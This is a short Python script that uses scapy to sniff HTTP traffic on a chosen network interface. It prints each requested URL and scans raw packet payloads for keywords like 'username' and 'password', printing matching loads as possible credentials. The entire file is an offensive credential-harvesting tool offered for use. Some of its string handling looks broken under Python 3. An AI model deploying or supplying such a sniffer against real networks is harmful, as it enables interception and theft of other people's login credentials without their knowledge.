#!/usr/bin/env python3

import re
import scapy.all as scapy
from scapy.fields import PacketLenField
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest= "interface", help= "Enter Network Interface")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface = interface, store=False, prn= process_sniffed_packet)
    

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username","user","login","password","pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
                    break

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible usernam/password >>" + login_info + "\n\n")

    
    
options = get_arguments()
sniff(options.interface)
